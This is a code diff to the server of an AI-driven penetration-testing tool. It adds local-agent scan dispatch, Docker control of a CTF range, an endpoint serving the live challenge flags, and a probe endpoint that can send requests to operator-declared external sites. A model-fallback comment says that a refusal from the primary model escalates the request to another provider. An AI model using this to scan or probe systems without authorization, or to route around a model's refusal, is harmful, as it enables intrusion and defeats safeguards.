 // the key in the body, so we accept it to avoid breaking it. Moving to a header
 // needs a coordinated UI change and is out of scope. The body key is only ever
 // reachable from the local operator (loopback bind + origin guard).
+/**
+ * Fail fast when a scan/mission targets the LOCAL LLM provider but the server
+ * behind the local base URL can't serve the requested model. Ollama auto-pulls
+ * missing tags on demand — which hangs for minutes and only surfaces as
+ * "Local LLM request timed out" deep inside the scan. Validate up front and
+ * return an actionable message, or null when the provider isn't local or the
+ * listing can't be interpreted (fail open for non-standard servers).
+ */
+async function verifyLocalLLMServed(cfg: { provider: unknown; model: string; baseUrl?: string; apiKey?: string }): Promise<string | null> {
+  if (cfg?.provider !== 'local' && cfg?.provider !== 'ollama') return null;
+  const base = (cfg.baseUrl || 'http://localhost:11434/api').replace(/\/+$/, '');
+  // The named `ollama` provider (issue #164) always speaks Ollama native, whether the base
+  // was given bare (http://localhost:11434) or in the /api form; `local` keeps detecting it.
+  const isOllama = cfg.provider === 'ollama' || /\/api$/.test(base);
+  const listUrl = isOllama ? `${base.replace(/\/api$/, '')}/api/tags` : `${base}/models`;
+  const controller = new AbortController();
+  const timer = setTimeout(() => controller.abort(), 4000);
+  try {
+    const res = await fetch(listUrl, {
+      signal: controller.signal,
+      ...(cfg.apiKey ? { headers: { Authorization: `Bearer ${cfg.apiKey}` } } : {}),
+    });
+    if (!res.ok) return `Local LLM at ${base} responded ${res.status} while listing models — verify the server is running.`;
+    const data: any = await res.json().catch(() => null);
+    const served: string[] | null = isOllama
+      ? (Array.isArray(data?.models) ? data.models.map((m: any) => String(m?.name || m?.model || '')).filter(Boolean) : null)
+      : (Array.isArray(data?.data) ? data.data.map((m: any) => String(m?.id || '')).filter(Boolean) : null);
+    if (!served) return null; // non-standard listing endpoint — fail open
+    const requested = String(cfg.model || '');
+    const hit = served.some(name => name === requested || name.split(':')[0] === requested.split(':')[0]);
+    if (!hit) {
+      return `Local LLM at ${base} does not serve model '${requested}'. Served: ${served.slice(0, 8).join(', ')}. ` +
+        `Pick a served model in Settings → Local model (or run: ollama pull ${requested}).`;
+    }
+    return null;
+  } catch (e) {
+    // Unreachable local is NOT a hard stop: the model ladder fails over to the next
+    // configured provider (e.g. OpenRouter), so warn and let the scan proceed.
+    console.warn(`[mission] local LLM unreachable at ${base} (${(e as Error).message}) — model ladder will fall back if configured`);
+    return null;
+  } finally {
+    clearTimeout(timer);
+  }
+}
+
 function resolveGeneralLLMConfig(provider: string | undefined, model: string | undefined, apiKey: string | undefined, baseUrl?: string): {
   provider: any;
   model: string;
@@ -6993,9 +11545,16 @@ function resolveGeneralLLMConfig(provider: string | undefined, model: string | u
   maxTokens: number;
   temperature: number;
   timeout: number;
+  fallbackChain?: FallbackEntry[];
 } {
   const defaultConfig = config.getLLMConfig();
   const selectedProvider = provider || defaultConfig.provider;
+  // Model-failure ladder: when TEMPEST_MODEL_FALLBACK is on, a primary that can't
+  // answer (rate-limit, 5xx, timeout, auth, 404, refusal, empty) escalates to the
+  // next configured provider. Local/local-agent timeouts skip same-model retries
+  // (a single-slot local server just re-hits the same cap) and go straight to the
+  // next hop — e.g. local model stalls → OpenRouter answers instead of hanging.
+  const fallbackChain = config.buildFallbackChain(selectedProvider as any);
   // Local-agent backends use their own CLI login and need no T3MP3ST API key.
   if (selectedProvider === 'local-agent') {
     return {
@@ -7006,6 +11565,7 @@ function resolveGeneralLLMConfig(provider: string | undefined, model: string | u
       timeout: readGeneralTimeoutEnv()
         ?? readPositiveTimeoutEnv('T3MP3ST_LOCAL_AGENT_TIMEOUT_MS')
         ?? 600000,
+      fallbackChain,
     };
   }
   const baseConfig = config.getLLMConfig(selectedProvider as any, model);
@@ -7013,7 +11573,7 @@ function resolveGeneralLLMConfig(provider: string | undefined, model: string | u
   // llama.cpp / Ollama host). For any cloud provider it is ignored — never let a request
   // redirect a cloud call. A malformed/non-HTTP URL throws (callers already 400 on throw).
   let localBaseUrl: string | null = null;
-  if (selectedProvider === 'local') {
+  if (selectedProvider === 'local' || selectedProvider === 'ollama') {
     const bu = sanitizeLocalBaseUrl(baseUrl);
     if (!bu.ok) throw new Error(bu.error);
     localBaseUrl = bu.value;
@@ -7021,7 +11581,7 @@ function resolveGeneralLLMConfig(provider: string | undefined, model: string | u
   // SECURITY: when a client picks the local base URL, never fall back to the
   // server-configured key (TEMPEST_LOCAL_API_KEY / ZAI_API_KEY / ZHIPUAI_API_KEY —
   // possibly a real cloud bearer). Only a client-supplied key reaches a client-chosen host.
-  const effectiveKey = (selectedProvider === 'local' && localBaseUrl)
+  const effectiveKey = ((selectedProvider === 'local' || selectedProvider === 'ollama') && localBaseUrl)
     ? (apiKey || undefined)
     : (apiKey || baseConfig.apiKey);
   if (providerNeedsApiKey(selectedProvider) && !effectiveKey) {
@@ -7034,10 +11594,11 @@ function resolveGeneralLLMConfig(provider: string | undefined, model: string | u
     baseUrl: baseConfig.baseUrl,
     // Only override the configured URL for a local provider. Cloud providers keep
     // their own provider URL and cannot be redirected by a request.
-    ...(selectedProvider === 'local' && localBaseUrl ? { baseUrl: localBaseUrl } : {}),
+    ...((selectedProvider === 'local' || selectedProvider === 'ollama') && localBaseUrl ? { baseUrl: localBaseUrl } : {}),
     maxTokens: 8192,
     temperature: 0.4,
     timeout: readGeneralTimeoutEnv() ?? 300000, // General planning needs room (was a hardcoded 60s); override via env
+    fallbackChain,
   };
 }
 
@@ -7088,7 +11649,8 @@ async function runCodexExecReadinessProbe(command: string): Promise<{ stdout: st
   ];
 
   return new Promise((resolve, reject) => {
-    const child = spawn(command, args, {
+    // resolveBin + spawnAgent: Windows npm shim (codex.cmd) needs a cmd.exe-mediated launch.
+    const child = spawnAgent(resolveBin(command) || command, args, {
       stdio: ['pipe', 'pipe', 'pipe'],
       env: { ...process.env, NO_COLOR: '1' },
     });
@@ -7103,8 +11665,8 @@ async function runCodexExecReadinessProbe(command: string): Promise<{ stdout: st
     // Bounded accumulation so a runaway/verbose child can't grow these strings without limit
     // before the 30s timer fires (matches the local-agent caps). A normal probe emits a tiny
     // marker, so this only trims a pathological flood.
-    child.stdout.on('data', chunk => { if (stdout.length < 8_000_000) stdout += chunk.toString(); });
-    child.stderr.on('data', chunk => { if (stderr.length < 200_000) stderr += chunk.toString(); });
+    child.stdout?.on('data', chunk => { if (stdout.length < 8_000_000) stdout += chunk.toString(); });
+    child.stderr?.on('data', chunk => { if (stderr.length < 200_000) stderr += chunk.toString(); });
     child.on('error', error => {
       clearTimeout(timer);
       reject(error);
@@ -7120,7 +11682,7 @@ async function runCodexExecReadinessProbe(command: string): Promise<{ stdout: st
       }
     });
 
-    child.stdin.end(`Reply with exactly: ${marker}`);
+    child.stdin?.end(`Reply with exactly: ${marker}`);
   });
 }
 
@@ -7142,7 +11704,7 @@ function codexUnavailable(res: Response, error: any): void {
 app.get('/api/codex/status', async (_req: Request, res: Response): Promise<void> => {
   try {
     const command = config.get('codex').command || 'codex';
-    const { stdout } = await execFileAsync(command, ['--version'], { timeout: 5000 });
+    const { stdout } = await execVersionProbe(command, ['--version'], 5000);
     res.json({
       available: true,
       provider: 'codex',
@@ -7164,7 +11726,7 @@ app.get('/api/codex/status', async (_req: Request, res: Response): Promise<void>
 app.post('/api/codex/probe', async (_req: Request, res: Response): Promise<void> => {
   try {
     const command = config.get('codex').command || 'codex';
-    const { stdout } = await execFileAsync(command, ['--version'], { timeout: 5000 });
+    const { stdout } = await execVersionProbe(command, ['--version'], 5000);
     const payload: Record<string, unknown> = {
       available: true,
       provider: 'codex',
@@ -7311,6 +11873,11 @@ app.post('/api/general/plan', async (req: Request, res: Response): Promise<void>
 
   try {
     const generalConfig = resolveGeneralLLMConfig(provider, model, apiKey, baseUrl);
+    const localErr = await verifyLocalLLMServed(generalConfig as any);
+    if (localErr) {
+      res.status(503).json({ error: localErr });
+      return;
+    }
     // Create a dedicated LLM backbone for the General
     const generalLLM = new LLMBackbone(generalConfig);
 
@@ -7384,6 +11951,11 @@ app.post('/api/general/execute', async (req: Request, res: Response): Promise<vo
     generalConfig = resolveGeneralLLMConfig(provider, model, apiKey, baseUrl);
   } catch (error: any) {
     res.status(400).json({ error: error.message || 'API key required' });
+    return;
+  }
+  const localErr = await verifyLocalLLMServed(generalConfig as any);
+  if (localErr) {
+    res.status(503).json({ error: localErr });
     return;
   }
 
@@ -7504,6 +12076,11 @@ app.post('/api/general/auto', async (req: Request, res: Response): Promise<void>
     generalConfig = resolveGeneralLLMConfig(provider, model, apiKey, baseUrl);
   } catch (error: any) {
     res.status(400).json({ error: error.message || 'API key required' });
+    return;
+  }
+  const localErr = await verifyLocalLLMServed(generalConfig as any);
+  if (localErr) {
+    res.status(503).json({ error: localErr });
     return;
   }
 
@@ -7694,26 +12271,6 @@ import {
   scaffoldAttackGraph, validateAttackGraph, attackGraphReconPrompt, familyPhases,
   ATTACK_GRAPH_SCHEMA, type AttackGraph,
 } from './recon/attack-graph.js';
-import { handleCorrelationApi } from './threat-intel/correlation.js';
-import { CveVaultService } from './threat-intel/vault.js';
-
-const cveVaultService = new CveVaultService();
-
-/**
- * POST /api/recon/correlate-cves — correlate observed technology names with an
- * already-ingested KEV snapshot and optional EPSS snapshot. This endpoint does
- * not fetch remote data and returns candidates, never verified findings.
- */
-app.post('/api/recon/correlate-cves', (req: Request, res: Response): void => {
-  const result = handleCorrelationApi(req.body);
-  res.status(result.status).json(result.body);
-});
-
-/** POST /api/cve-vault/search — refresh audited feeds server-side and return unverified candidates. */
-app.post('/api/cve-vault/search', async (req: Request, res: Response): Promise<void> => {
-  const result = await cveVaultService.search(req.body);
-  res.status(result.status).json(result.body);
-});
 
 /**
  * POST /api/attack-graph — get an attack graph for a target.
@@ -8018,6 +12575,30 @@ type ConnectedLocalAgent = {
 };
 const connectedLocalAgents = new Map<string, ConnectedLocalAgent>();
 const LOCAL_AGENT_HEALTH_TTL_MS = 30_000;
+
+// ── Connected-agent selection survives a restart ──
+// The selection lived ONLY in the in-memory Map above, so every restart silently dropped it and
+// the operator's Settings panel came back empty — the "my settings didn't save" report. The web
+// UI mirrored it into localStorage and re-applied on load, which is why it looked intermittent:
+// it survived a page refresh but not a server restart, and a headless/mission run saw nothing.
+const LOCAL_AGENT_SELECTION_KEY = 'localAgents.connected';
+function persistLocalAgentSelection(reason: string): void {
+  dbSettings[LOCAL_AGENT_SELECTION_KEY] = Array.from(connectedLocalAgents.keys());
+  saveDbSettings(reason);
+}
+function restoreLocalAgentSelection(): void {
+  const stored = dbSettings[LOCAL_AGENT_SELECTION_KEY];
+  const ids = Array.isArray(stored) ? stored.filter((x): x is string => typeof x === 'string' && !!x) : [];
+  if (!ids.length) return;
+  connectedLocalAgents.clear();
+  for (const id of ids) {
+    // Re-register with a fresh timestamp. Deliberately no lastPing: the previous process's
+    // round-trip says nothing about THIS process, and carrying it forward would let a stale
+    // "ok" satisfy the live-backend gate for a CLI that is not actually running.
+    connectedLocalAgents.set(id, { id, label: id, connectedAt: Date.now() });
+  }
+  console.log(`[T3MP3ST] Restored ${ids.length} connected local agent(s): ${ids.join(', ')}`);
+}
 // A 15s liveness probe SIGKILLs a slow-but-alive local reasoning agent (which spends tens of
 // seconds thinking even on the trivial PONG probe), making requireLiveLocalAgent falsely reject
 // a healthy backend. Default to 90s and let the operator raise it via env for very slow models.
@@ -8065,9 +12646,18 @@ async function requireLiveLocalAgent(model: string | undefined): Promise<{ ok: t
 }
 
 // GET /api/agents/local/detect — which agents are installed / authed / ready (no tokens spent)
-app.get('/api/agents/local/detect', async (_req: Request, res: Response): Promise<void> => {
+let localAgentDetectCache: { at: number; agents: Awaited<ReturnType<typeof detectLocalAgents>> } | null = null;
+app.get('/api/agents/local/detect', async (req: Request, res: Response): Promise<void> => {
   try {
+    // Each uncached detect re-probes every agent CLI (resolveBin + version + auth) — ~10s wall on
+    // this box. The Settings UI polls the route, so serve a 60s cache; `?refresh=1` forces a re-probe.
+    const refresh = req.query.refresh === '1' || req.query.refresh === 'true';
+    if (!refresh && localAgentDetectCache && Date.now() - localAgentDetectCache.at < 60_000) {
+      res.json({ agents: localAgentDetectCache.agents, connected: Array.from(connectedLocalAgents.keys()), cached: true });
+      return;
+    }
     const agents = await detectLocalAgents();
+    localAgentDetectCache = { at: Date.now(), agents };
     res.json({ agents, connected: Array.from(connectedLocalAgents.keys()) });
   } catch (e) {
     res.status(500).json({ error: String((e as Error).message) });
@@ -8100,6 +12690,7 @@ app.post('/api/agents/local/connect', async (req: Request, res: Response): Promi
     results.push({ id, status: 'active', label: d.label, version: d.version, authMethod: d.authMethod, ping });
   }
   syncLocalAgentSelection(connectedLocalAgents, ids, replace);
+  persistLocalAgentSelection('local-agents.connect');
   res.json({ results, connected: Array.from(connectedLocalAgents.values()) });
 });
 
@@ -8116,12 +12707,51 @@ app.post('/api/agents/local/ping', async (req: Request, res: Response): Promise<
   res.json({ id: body.id, ...r });
 });
 
-// POST /api/agents/local/dispatch { id, prompt, model?, timeoutMs? } — drive a connected agent as an operator
+// POST /api/agents/local/dispatch { id, prompt, model?, timeoutMs?, target? } — drive a connected agent as an operator
 app.post('/api/agents/local/dispatch', async (req: Request, res: Response): Promise<void> => {
   const body = req.body || {};
   if (!connectedLocalAgents.has(body.id)) { res.status(400).json({ error: 'agent not connected — connect it first' }); return; }
   if (!body.prompt) { res.status(400).json({ error: 'prompt required' }); return; }
+  const targetHint = typeof body.target === 'string' && body.target.trim() ? body.target.trim() : (extractScanTarget(String(body.prompt || '')) || 'local-agent');
+  // Local-agent scans are first-class citizens on the Live Scan feed — emit the same
+  // ScanProgressEvent shape the mission engine broadcasts so dispatches stream live.
+  const progressEvent = (kind: 'task_started' | 'task_completed', detail: string, success?: boolean): void => {
+    try {
+      broadcastEvent('scan:progress', {
+        id: `dispatch-${Date.now()}-${Math.random().toString(16).slice(2, 8)}`,
+        timestamp: Date.now(),
+        kind,
+        operatorId: `agent:${body.id}`,
+        callsign: String(body.id).toUpperCase(),
+        archetype: 'local-agent',
+        taskName: `Agent scan — ${targetHint}`,
+        detail: String(detail || '').slice(0, 2000),
+        success,
+      });
+    } catch { /* live feed is best-effort */ }
+  };
+  progressEvent('task_started', `Dispatching scan to ${body.id}: ${String(body.prompt || '').slice(0, 500)}`);
   const r = await runLocalAgent(body.id, body.prompt, { model: body.model, timeoutMs: body.timeoutMs });
+  progressEvent('task_completed', r.ok
+    ? `Scan completed via ${body.id} in ${r.latencyMs}ms\n${String(r.output || '').slice(0, 1500)}`
+    : `Scan FAILED via ${body.id}: ${r.error || 'unknown error'}`, r.ok);
+  // Record EVERY dispatch into the Evidence Vault (by domain, live) — a scan that
+  // isn't recorded is a scan that never happened.
+  try {
+    recordScanEvidence({
+      source: 'agent',
+      kind: 'scan',
+      tool: `local-agent:${body.id}${body.model ? `@${body.model}` : ''}`,
+      target: targetHint,
+      summary: r.ok
+        ? `Scan completed via ${body.id} in ${r.latencyMs}ms`
+        : `Scan FAILED via ${body.id}: ${r.error || 'unknown error'}`,
+      detail: r.output || r.error || '(no output)',
+      command: String(body.prompt || ''),
+    });
+  } catch (e) {
+    console.warn('[agents] failed to record dispatch evidence:', (e as Error).message);
+  }
   res.json({ id: body.id, ...r });
 });
 
@@ -8129,7 +12759,43 @@ app.post('/api/agents/local/dispatch', async (req: Request, res: Response): Prom
 app.post('/api/agents/local/disconnect', (req: Request, res: Response): void => {
   const id = (req.body || {}).id;
   connectedLocalAgents.delete(id);
+  persistLocalAgentSelection('local-agents.disconnect');
   res.json({ ok: true, connected: Array.from(connectedLocalAgents.keys()) });
+});
+
+// ── Operator-defined custom agents (Settings → Local Agents → Add custom agent) ──
+// Definitions persist in ~/.t3mp3st/custom-agents.json (outside the repo — GitHub-safe)
+// and merge into detect/connect/ping/dispatch like the built-in CLIs.
+
+app.get('/api/agents/local/custom', (_req: Request, res: Response): void => {
+  res.json({ agents: loadCustomAgents() });
+});
+
+app.post('/api/agents/local/custom', (req: Request, res: Response): void => {
+  const body = req.body || {};
+  const norm = normalizeCustomAgent(body);
+  if ('error' in norm) { res.status(400).json({ error: norm.error }); return; }
+  const list = loadCustomAgents();
+  const existing = list.findIndex((c) => c.id === norm.id);
+  if (existing >= 0) list[existing] = norm; // upsert by id
+  else list.push(norm);
+  try {
+    saveCustomAgents(list);
+  } catch (e) {
+    res.status(500).json({ error: `could not persist custom agent: ${(e as Error).message}` });
+    return;
+  }
+  res.json({ ok: true, agent: norm, agents: list });
+});
+
+app.delete('/api/agents/local/custom/:id', (req: Request, res: Response): void => {
+  const id = req.params.id;
+  const list = loadCustomAgents();
+  const next = list.filter((c) => c.id !== id);
+  if (next.length === list.length) { res.status(404).json({ error: `no custom agent '${id}'` }); return; }
+  saveCustomAgents(next);
+  connectedLocalAgents.delete(id); // a deleted agent can't stay enlisted
+  res.json({ ok: true, agents: next });
 });
 
 // GET /api/agents/local/status — connected agents, optionally with a bounded live health check.
@@ -8140,6 +12806,355 @@ app.get('/api/agents/local/status', async (req: Request, res: Response): Promise
 });
 
 // =============================================================================
+// CTF RANGE — live Docker status & control for the dashboard's CTF Range page
+// =============================================================================
+
+// The range is the compose project under <repo>/ctf. npm scripts launch the
+// server from the repo root; walk up so a tsx invocation from src/ also lands
+// on the compose file.
+function resolveCtfRangeDir(): string | null {
+  for (const dir of [process.cwd(), join(process.cwd(), '..'), join(process.cwd(), '..', '..')]) {
+    if (existsSync(join(dir, 'ctf', 'docker-compose.yml'))) return join(dir, 'ctf');
+  }
+  return null;
+}
+
+interface CtfRangeContainer {
+  name: string;
+  service: string;
+  state: string;
+  health: 'healthy' | 'unhealthy' | 'none';
+  hostPorts: number[];
+  reachable: boolean;
+}
+
+// One detached compose action at a time — up/build/down can run for minutes, so
+// they fire in the background and the dashboard polls /status for their output.
+const ctfRangeAction: { running: boolean; action: string; startedAt: number; output: string[] } = {
+  running: false, action: '', startedAt: 0, output: []
+};
+
+function startCtfRangeAction(action: string, args: string[]): boolean {
+  if (ctfRangeAction.running) return false;
+  const dir = resolveCtfRangeDir();
+  if (!dir) return false;
+  ctfRangeAction.running = true;
+  ctfRangeAction.action = action;
+  ctfRangeAction.startedAt = Date.now();
+  ctfRangeAction.output = [];
+  const child = spawn('docker', ['compose', ...args], { cwd: dir });
+  const push = (buf: Buffer): void => {
+    const lines = buf.toString().split(/\r?\n/).filter(Boolean);
+    ctfRangeAction.output.push(...lines);
+    if (ctfRangeAction.output.length > 80) ctfRangeAction.output.splice(0, ctfRangeAction.output.length - 80);
+  };
+  child.stdout?.on('data', push);
+  child.stderr?.on('data', push);
+  child.on('error', (err) => push(Buffer.from(String(err.message || err))));
+  child.on('close', (code) => {
+    ctfRangeAction.running = false;
+    ctfRangeAction.output.push(`[${action}] exit ${code === null ? 'killed' : code}`);
+  });
+  return true;
+}
+
+// TCP connect probe — distinguishes "container up" from "challenge answering".
+function probeCtfPort(port: number, timeoutMs = 900): Promise<boolean> {
+  return new Promise((resolve) => {
+    const sock = tcpConnect({ host: '127.0.0.1', port });
+    const done = (ok: boolean): void => { sock.destroy(); resolve(ok); };
+    sock.setTimeout(timeoutMs, () => done(false));
+    sock.once('connect', () => done(true));
+    sock.once('error', () => done(false));
+  });
+}
+
+// docker ps (no probes) for the ctf compose project — shared by /status and /probe.
+// The dashboard polls /status every ~5s and every probe/flags call needs the port
+// allowlist too; Docker Desktop's Windows pipe chokes on overlapping CLI spawns,
+// so serve one shared result per ~2.5s (stale cache beats a failed call).
+let ctfContainersCache: { at: number; list: CtfRangeContainer[] } | null = null;
+// ctf compose services that are infrastructure, not challenge targets (see the filter below).
+const CTF_NON_CHALLENGE_SERVICES = new Set<string>(['t3mp3st', 'attacker']);
+async function ctfRangeContainersFromDocker(): Promise<CtfRangeContainer[]> {
+  if (ctfContainersCache && Date.now() - ctfContainersCache.at < 2500) return ctfContainersCache.list;
+  for (let attempt = 0; attempt < 2; attempt++) {
+    try {
+      const { stdout } = await execFileAsync('docker', [
+        'ps', '-a',
+        '--format', '{{.Names}}\t{{.Label "com.docker.compose.service"}}\t{{.State}}\t{{.Status}}\t{{.Ports}}'
+      ], { timeout: 8000 });
+
+      const containers: CtfRangeContainer[] = [];
+      for (const line of stdout.split(/\r?\n/).filter(Boolean)) {
+        const [name, service, state, status, ports] = line.split('\t');
+        const isCtf = String(name || '').startsWith('ctf_') || String(service || '').startsWith('ctf-');
+        const isPentAGI = String(name || '').includes('pentagi') || String(service || '').includes('pentagi');
+        if (!isCtf && !isPentAGI) continue;
+        if (CTF_NON_CHALLENGE_SERVICES.has(String(service || ''))) continue;
+        const hostPorts = [...String(ports || '').matchAll(/:(\d+)->/g)].map((m) => parseInt(m[1], 10));
+        containers.push({
+          name,
+          service: service || (isPentAGI ? (name.includes('pentagi-1') ? 'pentagi' : name) : name),
+          state,
+          health: /unhealthy/.test(status) ? 'unhealthy' : /healthy/.test(status) ? 'healthy' : 'none',
+          hostPorts,
+          reachable: false
+        });
+      }
+      ctfContainersCache = { at: Date.now(), list: containers };
+      return containers;
+    } catch (e) {
+      if (attempt === 0) { await new Promise((r) => setTimeout(r, 600)); continue; }
+      if (ctfContainersCache) {
+        console.warn('[ctf] docker ps failed twice, serving stale cache:', (e as Error).message?.slice(0, 300));
+        return ctfContainersCache.list;
+      }
+      // Docker down / pipe unavailable is an EXPECTED state (Docker Desktop not started yet),
+      // not a server error — degrade to an empty range instead of 500-ing the dashboard.
+      console.warn('[ctf] docker ps unavailable — serving empty range:', (e as Error).message?.slice(0, 200));
+      ctfContainersCache = { at: Date.now(), list: [] };
+      return [];
+    }
+  }
+  throw new Error('unreachable');
+}
+
+// GET /api/ctf/range/status — live container states for the ctf compose project,
+// plus a per-port reachability probe on every published host port.
+app.get('/api/ctf/range/status', async (_req: Request, res: Response): Promise<void> => {
+  const dir = resolveCtfRangeDir();
+  if (!dir) { res.status(500).json({ error: 'ctf/docker-compose.yml not found on the server host' }); return; }
+  try {
+    const containers = await ctfRangeContainersFromDocker();
+    await Promise.all(containers.map(async (c) => {
+      if (c.state !== 'running' || !c.hostPorts.length) return;
+      c.reachable = (await Promise.all(c.hostPorts.map((p) => probeCtfPort(p)))).some(Boolean);
+    }));
+
+    res.json({
+      docker: true,
+      dir,
+      containers,
+      action: {
+        running: ctfRangeAction.running,
+        action: ctfRangeAction.action,
+        startedAt: ctfRangeAction.startedAt || undefined,
+        output: ctfRangeAction.output.slice(-15)
+      }
+    });
+  } catch (e) {
+    const msg = String((e as Error).message || e);
+    if (/cannot connect|daemon|is the docker|ENOENT|not recognized|system cannot find/i.test(msg)) {
+      // Docker daemon down or CLI missing — not a server bug; report so the UI can say which.
+      res.json({ docker: false, containers: [], action: { running: false, output: [] } });
+    } else {
+      res.status(500).json({ error: msg });
+    }
+  }
+});
+
+// POST /api/ctf/range/control {action:'up'|'build'|'down'|'stop'|'start', service?}
+// up/build/down run detached (progress lands in /status output); stop/start target
+// one compose service and are awaited so the UI gets immediate ok/error.
+app.post('/api/ctf/range/control', async (req: Request, res: Response): Promise<void> => {
+  const body = req.body || {};
+  const action = String(body.action || '');
+  const service = body.service ? String(body.service) : null;
+  const dir = resolveCtfRangeDir();
+  if (!dir) { res.status(500).json({ error: 'ctf/docker-compose.yml not found on the server host' }); return; }
+
+  try {
+    if (action === 'up' || action === 'build' || action === 'down') {
+      const args = action === 'up' ? ['up', '-d', '--build'] : [action];
+      const started = startCtfRangeAction(action, args);
+      if (!started) { res.status(409).json({ error: `another range action ("${ctfRangeAction.action}") is already running` }); return; }
+      res.json({ ok: true, started: true, message: `${action} started — poll /api/ctf/range/status for progress` });
+      return;
+    }
+    if (action === 'stop' || action === 'start') {
+      if (!service) { res.status(400).json({ error: 'service required for stop/start' }); return; }
+      if (action === 'stop') {
+        await execFileAsync('docker', ['compose', 'stop', service], { cwd: dir, timeout: 30000 });
+      } else {
+        await execFileAsync('docker', ['compose', 'up', '-d', '--no-deps', service], { cwd: dir, timeout: 60000 });
+      }
+      res.json({ ok: true });
+      return;
+    }
+    res.status(400).json({ error: 'action must be up|build|down|stop|start' });
+  } catch (e) {
+    res.status(500).json({ error: String((e as Error).message || e) });
+  }
+});
+
+// GET /api/ctf/range/flags — the REAL flag each running challenge container was
+// started with (CTF_FLAG env, keyed by compose service), so the dashboard can
+// verify agent-captured flags against the live targets instead of format-checking.
+// These values already sit in plaintext in ctf/docker-compose.yml; this API serves
+// the local operator dashboard only. Cached briefly — flags only change when a
+// container is recreated — and retried once against transient docker pipe glitches.
+let ctfFlagsCache: { at: number; flags: Record<string, string> } | null = null;
+app.get('/api/ctf/range/flags', async (_req: Request, res: Response): Promise<void> => {
+  if (ctfFlagsCache && Date.now() - ctfFlagsCache.at < 15000) { res.json({ flags: ctfFlagsCache.flags }); return; }
+  try {
+    const containers = await ctfRangeContainersFromDocker();
+    const ids = containers.filter((c) => c.state === 'running').map((c) => c.name);
+    if (!ids.length) { res.json({ flags: {} }); return; }
+
+    let parsed: unknown = null;
+    for (let attempt = 0; attempt < 2 && !parsed; attempt++) {
+      try {
+        // 30s: docker inspect can crawl on a freshly-restarted Docker Desktop (observed 16s for one container)
+        const { stdout } = await execFileAsync('docker', ['inspect', ...ids], { timeout: 30000, maxBuffer: 1024 * 1024 * 8 });
+        parsed = JSON.parse(stdout);
+      } catch (_) {
+        if (attempt === 0) await new Promise((r) => setTimeout(r, 600)); // transient pipe glitch — retry
+        else throw _;
+      }
+    }
+
+    const flags: Record<string, string> = {};
+    for (const raw of (parsed || []) as Array<{ Name?: string; Config?: { Labels?: Record<string, string>; Env?: string[] } }>) {
+      const service = raw.Config?.Labels?.['com.docker.compose.service'];
+      const flag = (raw.Config?.Env || []).find((e) => e.startsWith('CTF_FLAG='))?.slice('CTF_FLAG='.length);
+      if (service && flag) flags[service] = flag;
+    }
+    ctfFlagsCache = { at: Date.now(), flags };
+    res.json({ flags });
+  } catch (e) {
+    if (ctfFlagsCache) { res.json({ flags: ctfFlagsCache.flags, stale: true }); return; }
+    res.status(500).json({ error: String((e as Error).message || e) });
+  }
+});
+
+// Raw TCP probe for pwn challenges — send bytes, collect the reply until the peer
+// closes or goes quiet. Returns utf8 text (these services speak ASCII protocols).
+function ctfTcpRoundtrip(port: number, data: string, maxMs = 6000): Promise<string> {
+  return new Promise((resolve) => {
+    const chunks: Buffer[] = [];
+    const sock = tcpConnect({ host: '127.0.0.1', port });
+    const finish = (): void => {
+      if (quietTimer) clearTimeout(quietTimer);
+      clearTimeout(hardTimer);
+      sock.destroy();
+      resolve(Buffer.concat(chunks).toString('utf8').slice(0, 8192));
+    };
+    // quiet-window timer: reset on every chunk; only arms once first data arrives
+    let quietTimer: NodeJS.Timeout | null = null;
+    const armQuiet = (): void => {
+      if (quietTimer) clearTimeout(quietTimer);
+      quietTimer = setTimeout(finish, 1500);
+    };
+    const hardTimer = setTimeout(finish, maxMs);
+    sock.setTimeout(3000, () => {
+      if (!chunks.length) finish(); else armQuiet();
+    });
+    sock.once('connect', () => { sock.write(data); });
+    sock.on('data', (b: Buffer) => { chunks.push(b); armQuiet(); });
+    sock.once('close', finish);
+    sock.once('error', finish);
+  });
+}
+
+// POST /api/ctf/range/probe — one live interaction with a target, executed
+// server-side so the browser agent can drive the real containers:
+//   { kind:'http', method?, url, headers?, body? }  — HTTP request
+//   { kind:'tcp',  port, data }                     — raw TCP roundtrip (pwn)
+// Range targets (challenge runs) are locked to loopback + ports actually published
+// by running ctf containers. `external:true` marks an operator-declared custom
+// target (typed into the dashboard's target window) and unlocks http(s) fetching
+// of that site — the operator explicitly aimed the tool at it.
+app.post('/api/ctf/range/probe', async (req: Request, res: Response): Promise<void> => {
+  const body = req.body || {};
+  const external = body.external === true;
+  const probeStartedAt = Date.now();
+  let allowed: Set<number>;
+  try {
+    const containers = await ctfRangeContainersFromDocker();
+    allowed = new Set(containers.filter((c) => c.state === 'running').flatMap((c) => c.hostPorts));
+  } catch (dockerErr) {
+    // External website tests must not hang because Docker Desktop's Windows pipe glitched.
+    // Range tests still need the allowlist, so only external gets a free pass here.
+    if (!external) throw dockerErr;
+    console.warn('[ctf probe] docker ps failed for external probe, proceeding without allowlist:', (dockerErr as Error).message);
+    allowed = new Set<number>();
+  }
+  try {
+    if (!allowed.size && !external) { res.status(409).json({ error: 'range is not running — launch it first' }); return; }
+
+    if (body.kind === 'http') {
+      let url: URL;
+      try { url = new URL(String(body.url || '')); } catch { res.status(400).json({ error: 'invalid url' }); return; }
+      const host = url.hostname.toLowerCase();
+      const loopback = ['localhost', '127.0.0.1', '[::1]', '::1'].includes(host);
+      // url.port is '' for default ports — treat '' as the default for its scheme when comparing.
+      const portForCheck = url.port ? parseInt(url.port, 10) : (url.protocol === 'https:' ? 443 : 80);
+      if (!external && (!loopback || !allowed.has(portForCheck) && !allowed.has(parseInt(url.port || '0', 10)))) {
+        // Keep the strict loopback check, but also accept default-port URLs whose explicit port is in the allowlist.
+        const explicitPort = url.port ? parseInt(url.port, 10) : NaN;
+        const matchesExplicit = !Number.isNaN(explicitPort) && allowed.has(explicitPort);
+        if (!matchesExplicit && !allowed.has(portForCheck)) {
+          res.status(403).json({ error: `target must be a running range port (allowed: ${[...allowed].sort((a, b) => a - b).join(', ')}) — or pass external:true for an operator-declared target` });
+          return;
+        }
+      }
+      if (external && !/^https?:$/.test(url.protocol)) {
+        res.status(400).json({ error: 'external targets must be http(s)' });
+        return;
+      }
+      const method = String(body.method || 'GET').toUpperCase();
+      const init: RequestInit = { method, signal: AbortSignal.timeout(25000) };
+      if (body.body) init.body = String(body.body);
+      // Merge operator headers with sensible defaults for external WAFs (many 403 without a real UA).
+      const headers: Record<string, string> = { 'User-Agent': 'T3MP3ST/2.0 (operator-authorized probe)', 'Accept': '*/*' };
